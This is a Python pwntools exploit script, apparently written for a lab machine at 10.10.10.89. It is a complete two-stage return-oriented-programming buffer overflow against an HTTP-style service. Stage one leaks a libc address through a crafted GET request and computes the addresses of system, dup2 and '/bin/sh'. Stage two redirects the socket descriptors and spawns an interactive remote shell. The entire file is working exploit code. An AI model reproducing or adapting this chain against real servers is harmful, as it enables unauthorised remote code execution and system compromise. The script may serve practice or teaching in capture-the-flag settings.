#!/usr/bin/python

from pwn import *

import urllib
import sys

r = remote('10.10.10.89', 1111)

fd = 4
offset = 568
junk = p64(0xAABBAABBAABBAABB)

plt_read = p64(0x400cf0)
plt_write = p64(0x400c50)
poprdi = p64(0x4011dd)
poprsi = p64(0x4011db)

payload_stage1 = ''
payload_stage1 += 'A' * offset
payload_stage1 += poprdi + p64(fd)
payload_stage1 += poprsi + p64(0x603088) + junk
payload_stage1 += plt_write

r.send('GET /%s\n\n' % urllib.quote(payload_stage1))
buf = r.recv().split('File not found')[1][0:8]
read_addr = u64(buf)
libc_base = read_addr - 0xf7250    # https://libc.blukat.me/?q=_rtld_global%3A0&l=libc6_2.23-0ubuntu10_amd64
system_addr = libc_base + 0x45390
str_bin_sh = libc_base + 0x18cd57
dup2 = libc_base + 0xf7970

log.info('libc base address is: %s' % hex(libc_base))
log.info('read address is : %s' % hex(read_addr))
log.info('system address is: %s' % hex(system_addr))
log.info('dup2 address is: %s' % hex(dup2))
log.info('/bin/sh address is: %s' % hex(str_bin_sh))

r2 = remote('10.10.10.89', 1111)
payload_stage2 = ''
payload_stage2 += 'A' * offset
payload_stage2 += poprdi + p64(fd)
payload_stage2 += poprsi + p64(0x0) + junk
payload_stage2 += p64(dup2)
payload_stage2 += poprdi + p64(fd)
payload_stage2 += poprsi + p64(0x1) + junk
payload_stage2 += p64(dup2)
payload_stage2 += poprdi + p64(str_bin_sh)
payload_stage2 += p64(system_addr)

r2.send('GET /%s\n\n' % urllib.quote(payload_stage2))
r2.recvuntil('File not found')
r2.interactive()
